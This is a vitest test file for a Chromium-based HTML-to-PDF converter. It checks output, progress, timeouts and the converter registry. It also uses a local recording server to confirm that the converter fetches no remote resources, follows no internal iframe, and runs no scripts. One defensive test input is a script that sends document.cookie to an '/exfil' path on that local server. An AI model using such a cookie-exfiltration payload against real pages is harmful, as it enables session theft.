import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import * as mupdf from 'mupdf'
import { HtmlConverter } from '../src/converters/html.js'
import { ConversionTimeout, ConverterRegistry } from '../src/converters/types.js'
import { createRegistry, createHandlers } from '../src/index.js'

const encode = (html: string) => new TextEncoder().encode(html)

/** Reads the text back out of the produced PDF, so assertions are about the document. */
function textOf(pdf: Uint8Array): string {
  const doc = mupdf.Document.openDocument(Buffer.from(pdf), 'application/pdf')
  const out: string[] = []
  for (let i = 0; i < doc.countPages(); i++) {
    const page = doc.loadPage(i)
    page.toStructuredText('').walk({
      onChar: (c: string) => out.push(c),
    })
  }
  return out.join('')
}

describe('HtmlConverter', () => {
  const converter = new HtmlConverter()

  it('turns real HTML into a real PDF', async () => {
    const pdf = await converter.convert(
      encode('<!DOCTYPE html><html><body><h1>Quarterly report</h1></body></html>'),
    )
    // Not a substring search: the bytes are opened by the same engine the
    // rest of the product reads documents with.
    expect(new TextDecoder().decode(pdf.subarray(0, 5))).toBe('%PDF-')
    expect(textOf(pdf)).toContain('Quarterly report')
  }, 60_000)

  it('reports progress on the way', async () => {
    const seen: number[] = []
    await converter.convert(encode('<html><body>x</body></html>'), {
      report: (p) => seen.push(p),
    })
    expect(seen.length).toBeGreaterThan(0)
    expect(seen.at(-1)).toBe(1)
    // Monotonic: a progress bar that goes backwards is worse than none.
    expect([...seen].sort((a, b) => a - b)).toEqual(seen)
  }, 60_000)

  it('renders more than one page when the content needs them', async () => {
    const long = '<p style="page-break-after: always">Page one</p><p>Page two</p>'
    const pdf = await converter.convert(encode(`<html><body>${long}</body></html>`))
    const doc = mupdf.Document.openDocument(Buffer.from(pdf), 'application/pdf')
    expect(doc.countPages()).toBe(2)
  }, 60_000)
})

/**
 * The security properties, each asserted by observing the outside world
 * rather than by inspecting the configuration.
 *
 * A test that checked `javaScriptEnabled: false` was passed would pass
 * whether or not the flag did anything.
 */
describe('what the converter refuses to do', () => {
  const converter = new HtmlConverter()

  let server: Server
  let hits: string[] = []
  let origin: string

  beforeAll(async () => {
    server = createServer((req, res) => {
      hits.push(req.url ?? '')
      res.writeHead(200, { 'content-type': 'text/plain' })
      res.end('fetched')
    })
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
    origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  })

  afterAll(async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()))
  })

  /**
   * A real server, on a real port, that records every request it receives.
   *
   * If the converter fetched the pixel, this server would know. Converting
   * a document must not tell a third party that the document was
   * converted, at this time, from this address.
   */
  it('does not fetch a remote resource, and the server proves it', async () => {
    hits = []
    const html = `<!DOCTYPE html><html>
      <head><link rel="stylesheet" href="${origin}/theme.css"></head>
      <body>
        <img src="${origin}/pixel.png" alt="">
        <p>Visible text</p>
      </body></html>`

    const pdf = await converter.convert(encode(html))

    expect(hits).toEqual([])
    // And it still produced a usable document rather than failing on the
    // aborted requests.
    expect(textOf(pdf)).toContain('Visible text')
  }, 60_000)

  /** The same block closes SSRF: a document asking for the metadata service gets nothing. */
  it('does not follow an iframe to an internal address', async () => {
    hits = []
    const html = `<html><body><iframe src="${origin}/internal"></iframe><p>Body</p></body></html>`
    await converter.convert(encode(html))
    expect(hits).toEqual([])
  }, 60_000)

  /**
   * The input is attacker-controlled. A browser engine executing it is a
   * browser engine running whatever the uploader wrote, inside our
   * infrastructure.
   *
   * The script here would replace the page's text if it ran, so the
   * assertion is about what ended up in the PDF -- not about a flag.
   */
  it('does not run a script', async () => {
    const html = `<!DOCTYPE html><html><body>
      <p id="t">SAFE</p>
      <script>document.getElementById('t').textContent = 'EXECUTED'</script>
      </body></html>`

    const pdf = await converter.convert(encode(html))
    const text = textOf(pdf)

    expect(text).toContain('SAFE')
    expect(text).not.toContain('EXECUTED')
  }, 60_000)

  it('does not run a script that tries to phone home either', async () => {
    hits = []
    const html = `<html><body><p>x</p>
      <script>fetch('${origin}/exfil?d=' + document.cookie)</script>
      </body></html>`
    await converter.convert(encode(html))
    expect(hits).toEqual([])
  }, 60_000)

  /**
   * The timeout has to end in a killed browser, not a rejected promise: a
   * promise that rejects while Chromium is still working leaves the
   * process running and reports a failure it did not cause.
   *
   * A millisecond is well inside the time a launch takes, so this fires
   * mid-flight, which is the case that matters.
   */
  it('stops on its wall clock and says that is what happened', async () => {
    const impatient = new HtmlConverter({ timeoutMs: 1 })
    await expect(impatient.convert(encode('<html><body>x</body></html>'))).rejects.toThrow(
      ConversionTimeout,
    )
  }, 60_000)

  it('describes a timeout in seconds rather than in Chromium internals', async () => {
    const impatient = new HtmlConverter({ timeoutMs: 1 })
    await expect(impatient.convert(encode('<html><body>x</body></html>'))).rejects.toThrow(
      /took longer than/,
    )
  }, 60_000)

  /** Malformed input is a normal Tuesday. It must produce a document, not an exception. */
  it('renders unclosed and nonsense markup rather than refusing', async () => {
    const pdf = await converter.convert(encode('<p><b>Unclosed <marquee>Legible'))
    expect(new TextDecoder().decode(pdf.subarray(0, 5))).toBe('%PDF-')
    expect(textOf(pdf)).toContain('Legible')
  }, 60_000)
})

describe('the registry', () => {
  it('has the HTML converter', () => {
    const registry = createRegistry()
    expect(registry.types()).toEqual(['html-to-pdf'])
    expect(registry.get('html-to-pdf')).toBeInstanceOf(HtmlConverter)
  })

  /**
   * Absent, not stubbed. A stub that throws at runtime is a feature the UI
   * offers, the user chooses, and that fails after the file has already
   * been sent -- which is worse than a feature that is not offered.
   */
  it('has no entry for office or OCR', () => {
    const registry = createRegistry()
    for (const absent of ['office-to-pdf', 'pdf-to-office', 'ocr', 'pdf-to-word']) {
      expect(registry.has(absent)).toBe(false)
    }
  })

  it('produces one handler per registered converter, and no others', () => {
    const handlers = createHandlers()
    expect(Object.keys(handlers)).toEqual(['html-to-pdf'])
  })

  /** The handler is the queue's view of a converter: bytes in, bytes out, progress through. */
  it('runs a conversion through the handler the queue would call', async () => {
    const handlers = createHandlers()
    const seen: number[] = []
    const result = await handlers['html-to-pdf']!({
      type: 'html-to-pdf',
      input: encode('<html><body><p>Through the queue</p></body></html>'),
      signal: new AbortController().signal,
      report: (p) => seen.push(p),
    })
    expect(textOf(result)).toContain('Through the queue')
    expect(seen.at(-1)).toBe(1)
  }, 60_000)

  it('is empty until something registers', () => {
    expect(new ConverterRegistry().types()).toEqual([])
  })
})
